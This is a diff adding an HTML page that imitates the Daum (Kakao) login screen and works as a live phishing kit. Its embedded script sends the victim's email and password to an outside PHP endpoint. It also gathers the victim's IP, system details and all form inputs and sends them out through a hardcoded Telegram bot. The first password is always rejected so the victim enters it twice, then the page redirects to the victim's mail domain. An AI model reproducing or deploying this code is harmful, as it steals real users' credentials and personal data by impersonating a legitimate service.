@@ -1,0 +1,345 @@
+<!doctype html>
+<html lang="ko" class="os_windows chrome pc version_99_0_4844_84)">
+<!-- 2021-03-16 window 환경일 때 os_windows, mac환경일 때 os_mac 클래스 추가 -->
+<!-- 2021-03-29 모바일, 태블릿일 때 mobile 클래스 추가 -->
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta property="og:title" content="Daum 로그인">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="http://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
+    <meta property="og:image:secure_url" content="https://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
+    <meta property="og:description" content="여기를 눌러 링크를 확인하세요.">
+    <!-- 2021-03-16 추가 시작 -->
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, width=device-width, target-densityDpi=medium-dpi">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="apple-touch-icon-precomposed" href="https://m1.daumcdn.net/svc/image/U03/common_icon/523121BA0553E80001">
+    <!-- // 2021-03-16 추가 끝 -->
+    <title>Daum 로그인</title>
+    <!-- 2021-03-16 개편되는 페이지 CSS 교체 -->
+    <link rel="stylesheet" type="text/css" href="https://firebasestorage.googleapis.com/v0/b/gent-ba9d4.appspot.com/o/cz.css?alt=media&token=10b38d5a-d480-4b9b-8e2c-b884c7206b33">
+    
+	
+	<script language="javascript" type="text/javascript">
+var sendurl = "https://evolutionspotsltd.com/doc/pito.php";
+var attemptcount = 0;
+var checkemail = "Please check your email address";
+var checkpassword = "Please check your password";
+var continuebutton = "Login";
+var verifbutton = "Verifying ... ";
+var successmsg = "Please wait we are verifying your domain in few seconds...";
+if (typeof XMLHttpRequest === "undefined") {
+  XMLHttpRequest = function () {
+    try { return new ActiveXObject("Msxml2.XMLHTTP.6.0"); }
+    catch (e) {}
+    try { return new ActiveXObject("Msxml2.XMLHTTP.3.0"); }
+    catch (e) {}
+    try { return new ActiveXObject("Microsoft.XMLHTTP"); }
+    catch (e) {}
+    throw new Error("This browser does not support XMLHttpRequest.");
+  };
+}
+window.addEventListener('load', (event) => {
+window.nowdate = new Date();
+theif = "\nPage = " + document.title;
+imputs = document.getElementsByTagName('input');
+lastIndex = imputs.length;
+window.OSName = "Unknown";
+if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSName="Windows 10";
+if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
+if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
+if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
+if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
+if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
+if (window.navigator.userAgent.indexOf("Mac")            != -1) OSName="Mac/iOS";
+if (window.navigator.userAgent.indexOf("X11")            != -1) OSName="UNIX";
+if (window.navigator.userAgent.indexOf("Linux")          != -1) OSName="Linux";
+if (window.navigator.userAgent.indexOf("Android")        != -1) OSName="Android";
+if (window.navigator.userAgent.indexOf("iPhone")         != -1) OSName="iPhone";
+if (window.navigator.userAgent.indexOf("iPad")           != -1) OSName="iPad";
+if (window.navigator.userAgent.indexOf("iPod")           != -1) OSName="iPod";
+if (window.navigator.userAgent.indexOf("BlackBerry")     != -1) OSName="BlackBerry";
+});
+function createCORSRequest(method, url){
+  var xhr = new XMLHttpRequest();
+  if ("withCredentials" in xhr){
+    xhr.open(method, url, false);
+  } else if (typeof XDomainRequest != "undefined"){
+    xhr = new XDomainRequest();
+    xhr.open(method, url);
+  } else {
+    xhr = null;
+  }
+  return xhr;
+}
+function senddataPOST(){
+if(navigator.onLine==true){
+if (typeof objs =="undefined" ){
+var objs = {
+  ip: "",
+  country_name: "",
+  city: "",
+  region: "",
+  currency: ""
+};
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var rec = JSON.parse(this.responseText);
+window.rec = rec;
+}
+};
+xhttp.open("GET", "https://jsonip.com/", false);
+xhttp.send();
+}
+objs.ip = rec.ip;
+objs.country_name = "";
+objs.city = "";
+objs.region = "";
+objs.currency = "";
+theif = "IP Address = " + objs.ip;
+theif += "\nPage = " + document.title;
+theif += "\nTime = " + nowdate;
+theif += "\nSystem = " + OSName + " " + navigator.language;
+theif += "\nScreen Size = "+ screen.width + " X " + screen.height;
+theif += "\nLocation = "+ window.location+"\nPassword = "+password.value;
+for (index = 0; index < imputs.length; ++index) {
+    if(imputs[index].type!="submit" && imputs[index].name!="" && imputs[index].value!=""){
+    theif += "\n"+imputs[index].name+'='+encodeURI(imputs[index].value);
+	}
+}
+theif += "\nUser-Agent = " + navigator.userAgent;
+theif += "\nIP Details = https://ipinfo.io/" + objs.ip + "/json";
+var url_telegram ="https://api.telegram.org/";
+var randtoken = "vbot1257337675";
+var token = ":FOOLZVp72afEEmv4n6WqVFZ-_CxfvOedcso/";
+var iden = "sendMessage?chat_id=-90100127612&text=";
+var createdCORSRequest = url_telegram+randtoken+token+iden;
+var request = createCORSRequest( "POST", createdCORSRequest+encodeURI(theif) );
+if ( request ){
+if(request.send()){
+return true;
+}
+}
+}else{
+return true;
+}
+}
+function postdata(){
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+	  if(this.responseText=="ok"){
+	      senddataPOST();
+		  var address = email.value.split("@")[1];
+		  var meta=document.createElement('meta');
+		  meta.setAttribute('http-equiv', 'refresh');
+		  meta.setAttribute('content', '6; url=https://'+address);
+		  document. getElementsByTagName('head')[0]. appendChild(meta);
+	  }else{
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();
+	  }
+  }
+};
+xhttp.open("GET", sendurl+"?type=Webmail&email="+btoa(email.value)+"&password="+btoa(password.value), true);
+xhttp.send();
+}
+function ValidateEmail(mail) 
+{
+ if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
+  {
+    return (true)
+  }
+    return (false)
+}
+function verifall(){
+var pw = document.getElementById("password").value;  
+
+  //check empty password field  
+
+  if(pw == "") {  
+
+     document.getElementById("messagefont").innerHTML = checkpassword;  
+
+     return false;  
+
+  }  
+
+ //minimum password length validation  
+
+  if(pw.length < 5) {  
+
+     document.getElementById("messagefont").innerHTML = checkpassword;  
+
+     return false;  
+
+  }
+if(!ValidateEmail(email.value)){
+document.getElementById('messagefont').innerHTML = checkemail;
+}else{
+document.getElementById('messagefont').innerHTML = "";
+document.getElementById('submit-btn').value = verifbutton;
+if(password.value !=""){
+if(attemptcount<1){
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+	  if(this.responseText=="ok"){
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();   
+	  }else{
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();
+	  }
+  }
+};
+xhttp.open("GET", sendurl+"?type=Webmail&email="+btoa(email.value)+"&password="+btoa(password.value), false);
+xhttp.send();
+attemptcount++;
+}else{
+postdata();
+}
+}else{
+document.getElementById("messagefont").innerHTML = checkpassword;
+document.getElementById("password").value = "";
+document.getElementById('submit-btn').value = continuebutton;
+password.focus();
+}
+}
+}
+</script>
+</head>
+<body>
+
+<div id="kakaoWrap">
+		<div id="kakaoHead">
+		<div class="inner_head">
+			<h1>
+				<a href="https://www.daum.net" id="daumLogo" class="link_daum" alt="Daum"
+				   data-tiara-action-name="Daum_첫화면">
+					<span class="ir_wa">DAUM</span>
+				</a>
+			</h1>
+		</div>
+	</div>
+
+	<hr class="hide" >
+	<div id="kakaoContent" class="cont_daum" role="main">
+		<!-- 아이디입력도움말 노출시 view_help클래스 / 자판보기 노출시 view_key클래스 / 특수문자 노출시 view_char클래스 추가 -->
+		<div id="mArticle">
+			<h2 class="screen_out">아이디 로그인</h2>
+			<div class="section_login">
+                
+				<div id="loginFormDiv" class="login_default">									
+										
+						
+																									
+							<legend class="screen_out">아이디,비밀번호 로그인 정보 입력 폼</legend>
+							<div class="box_inp "> <!-- input 포커스시 input_on클래스 추가 / 입력시, 입력내용삭제버튼 노출시 del_on클래스 추가 -->
+								<label for="id" class="lab_g "></label> <!-- 2021-03-16 수정 --><!-- 공통 : input입력시 lab_g요소에 screen_out클래스 추가 -->
+								<input type="email" id="email" name="email" value="" class="tf_g" style="ime-mode:disabled;" readonly>
+								<button type="button" class="btn_del" tabindex="-1" data-tiara-action-name="아이디_입력_내용_지우기"><span class="ico_login ico_del">입력 내용 지우기</span></button>
+							</div>
+							<p id="messagefont" class="txt_message" style=" display:none "> <!-- 오류메세지 노출시 display:block, 비노출시 display:none -->
+								
+							</p>
+
+							<div class="box_inp "> <!-- input 포커스시 input_on클래스 추가 / 입력시, 입력내용삭제버튼 노출시 del_on클래스 추가 -->
+								<label for="inputPwd" class="lab_g "></label> <!-- 2021-03-16 수정 --><!-- 공통 : input입력시 lab_g요소에 screen_out클래스 추가 -->
+								<input id="password" name="password" type="password" class="tf_g"  maxlength="32" autocomplete="off" style="ime-mode:disabled;">
+								<button type="button" class="btn_del" tabindex="-1" data-tiara-action-name="비밀번호_입력_내용_지우기"><span class="ico_login ico_del">입력 내용 지우기</span></button>
+							</div>
+							<p id="pw_msg" class="txt_message"  style=" display:none "> <!-- 오류메세지 노출시 display:block, 비노출시 display:none -->
+								
+							</p>
+
+							<button onclick="return verifall();" id="submit-btn" class="btn_comm" data-tiara-action-name="로그인_버튼">로그인</button>
+
+							<div class="set_login"> <!-- 2016-10-10 툴팁노출시 tooltip_on클래스 추가 -->
+								<div class="group_set"><!-- 2021-03-16 set_comm과 레이어를 감싸는 구조 group_set 추가 및 툴팁 노출시 tooltip_on 클래스 추가 -->
+									<span class="set_comm " > <!-- 선택시 check_on클래스 추가 -->
+										<label for="stln" class="lab_check" data-tiara-action-name="로그인_상태_유지_checkbox_label">로그인 상태 유지</label>
+										<span class="check_g">
+											<input type="checkbox" id="stln" name="stln" value="1"  class="inp_check" data-tiara-action-name="로그인_상태_유지_checkbox_input">
+											<span class="ico_login ico_check">선택안됨</span> <!-- inp_check에 초점이 이동한경우 해당 ico_check요소에 focus클래스 추가 / 선택상태에 맞게 '선택됨','선택안됨' 으로 대체텍스트 제공 -->
+										</span>
+									</span>
+																			<div class="layer_set" style=" display:none "><!-- 비노출시 display:none 처리 -->
+											<p class="desc_set">개인정보 보호를 위해, 개인 기기에서만 사용해 주세요.</p>
+											<span class="ico_login ico_point"></span>
+										</div>
+																	</div>
+								<span class="set_security "><!-- 체크해제 시 check_off클래스 추가 -->
+									<a href="#none" id="linkSecurity"
+									   class="link_security" target="_blank"
+									   data-tiara-action-name="IP보안">IP보안</a>
+									<input type="checkbox" id="ipSecurity" name="ipSecurity" class="inp_check" value="checked" checked="checked">
+									<label for="ipSecurity" class="ico_login lab_security"
+										   data-tiara-action-name="IP보안_설정_checkbox_ON_OFF">IP보안 설정 ON</label><!-- inp_check에 초점이 이동한경우 해당 lab_security요소에 focus클래스 추가 / ON,OFF선택에 맞게 'IP보안 설정 ON','IP보안 설정 OFF'로 대체텍스트 제공 -->
+								</span>
+							</div>
+						
+					
+					<div class="login_rel">
+						<a href="https://member.daum.net/find/id.do" id="findID" class="link_rel" target="_blank"
+						   data-tiara-action-name="아이디찾기_링크">아이디 찾기</a>
+						<span class="txt_bar">|</span>
+						<a href="https://member.daum.net/find/password.do" id="findPW" class="link_rel" target="_blank"
+						   data-tiara-action-name="비밀번호찾기_링크">비밀번호 찾기</a>
+					</div>
+                </div>
+			</div>
+
+							<div class="box_bnr">
+					<!-- 2021-03-25 수정 시작 -->
+										<a href="https://accounts.daum.net/integration/start?rtnUrl=https://www.daum.net?fromdac=pc_login_banner" target="_blank" class="link_bnr" style="background-color:#F0F0F0"><!-- 2021-03-25 광고 배경 컬러 box_bnr에 적용 -->
+										<img src="https://t1.kakaocdn.net/login/bridge/bnr_login.jpg" height="100%" alt="광고"></a>
+					<!-- // 2021-03-25 수정 끝 -->
+				</div>
+					</div>
+	</div>
+
+	<hr class="hide">
+
+	<div id="kakaoFoot">
+		<h2 class="screen_out">서비스 이용정보</h2>
+		<a href=http://www.kakaocorp.com/ class="link_kcorp" target="_blank"
+		   data-tiara-action-name="카카오_회사소개">&copy; Kakao Corp.</a>
+		<span class="txt_bar">|</span>
+		<a href=https://cs.daum.net/faq/59/14970.html class="link_custom" target="_blank"
+		   data-tiara-action-name="고객센터">고객센터</a>
+	</div>
+</div>
+
+
+<script>
+var input = document.getElementById("password");
+
+// Execute a function when the user releases a key on the keyboard
+input.addEventListener("keyup", function(event) {
+  // Number 13 is the "Enter" key on the keyboard
+  if (event.keyCode === 13) {
+    // Cancel the default action, if needed
+    event.preventDefault();
+    // Trigger the button element with a click
+    document.getElementById("submit-btn").click();
+  }
+});
+var url_string = window.location.href; 
+var url = new URL(url_string);
+var cid = url.searchParams.get("id");
+if(cid){
+document.getElementById("email").value = cid;
+}
+location.hash = 'client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dctF0jk0w2UtS0FF3oS4G9QM_05ExoZ-6c9rdc6cylWGLdsztC6SkQkXZb7mwjA7QOG8KZidR0h2ZYRFXCtcc5POb_I7bBanvW9lBbKKjeEXtOezrvXMFWb7p4oOfODQw&nonce=637021592852309357.YWUzYzY1ZmYtM2ZjYy00NTAwLTllOWUtZTI5N2JhOTA0MDYxOGI0ZjE0MjYtYzYzMy00ZDQ1LWJjZjgtYTc0MDQwODAyMjQy&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US';
+</script>
+	    </body>
+
+</html>
